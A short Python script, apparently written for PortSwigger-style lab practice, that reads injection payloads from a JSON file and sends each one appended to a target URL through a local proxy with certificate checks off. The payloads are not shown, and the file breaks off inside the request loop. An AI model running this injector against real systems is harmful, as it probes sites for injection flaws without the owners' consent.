import requests
import sys
import urllib3
import json


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': '127.0.0.1:8080'}



def Inyeccion(url_objetivo):

    with open('Carga_CWE_20_CAPEC_07_Portswigger.json') as archivo:
        diccionario = json.load(archivo)


    print("[--] Asagi Injector")
    print("[i] Objetivo recibido {}".format(url_objetivo))
    print('''
    \tADVERTENCIA \n \tEl proceso inyectivo introducira funcionalidad no deseada por el operador del sistema objetivo.
    ''')
    print("\t[ATK] (inyeccion \'{}\')\n".format(url_objetivo))

    for llave in diccionario:
        print("[ATK] Inyectando :: {}".format(diccionario[llave]))
        dosis = requests.get(url_objetivo+diccionario[llave], verify=False, proxies=proxies)
